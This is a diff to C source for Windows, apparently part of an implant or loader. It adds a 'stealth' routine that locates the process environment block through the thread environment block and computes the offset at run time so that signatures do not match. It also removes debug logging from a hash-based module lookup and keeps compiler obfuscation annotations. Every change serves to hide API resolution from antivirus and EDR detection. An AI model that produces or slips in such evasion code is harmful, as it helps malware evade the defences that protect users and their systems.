@@ -2,6 +2,20 @@
 
 typedef HANDLE     (WINAPI *fn_LoadLibraryA)(PCHAR);
 
+// Stealth PEB resolution via TEB self-reference
+// Safer than __readgsqword(0x60) - no literal 0x60 constant
+__attribute__((__annotate__(("substitution,linearmba"))))
+PPEB get_peb_stealth() {
+    // TEB->Self is at gs:0x30 on x64 (NT_TIB.Self field)
+    // Calculate offset 0x30 at runtime to avoid signatures
+    DWORD64 teb_self_offset = (0x18 << 1) | 0x10;  // = 0x30
+
+    // Read TEB pointer from gs:0x30 (TEB.NtTib.Self)
+    PTEB teb = (PTEB)__readgsqword(teb_self_offset);
+
+    return teb->ProcessEnvironmentBlock;
+}
+
 __attribute__((__annotate__(("substitution,linearmba,indirectcall"))))
 PBYTE ldr_find_module(PPEB_LDR_DATA ldr, PCHAR target_module_name) {
     PLIST_ENTRY linked_lst = &ldr->InLoadOrderModuleList;
@@ -11,13 +25,8 @@ PBYTE ldr_find_module(PPEB_LDR_DATA ldr, PCHAR target_module_name) {
     while(linked_lst != curr){
         PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(curr, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
 
-        _inf("Module Base: 0x%p", entry->DllBase);
-        _inf("Module Size: 0x%lx", entry->SizeOfImage);
-
         WCHAR buffer[MAX_PATH] = {0};
         RtlCopyMemory(buffer, entry->BaseDllName.Buffer, entry->BaseDllName.Length / sizeof(WCHAR));
-        _inf("Module Name: %ls", buffer);
-        _inf("---------------------------");
 
         if (hash_x65599((PCHAR)neutrino_wchar_to_char(entry->BaseDllName.Buffer), entry->BaseDllName.Length / sizeof(WCHAR)) == hash_x65599(target_module_name, lstrlenA(target_module_name))) {
             _inf("Found %s, resolving functions...", target_module_name);
@@ -107,7 +116,12 @@ BOOL insert_new_dll(PHASHMAP func_map, PCHAR dll_name) {
         return FALSE;
     }
 
-    PEB* peb          = (PEB*)__readgsqword(0x60);
+    PPEB peb = get_peb_stealth();
+    if (!peb) {
+        _err("Failed to resolve PEB");
+        return FALSE;
+    }
+
     PEB_LDR_DATA* ldr = (PEB_LDR_DATA*)peb->Ldr;
 
     PBYTE dll_base = ldr_find_module(ldr, dll_name);
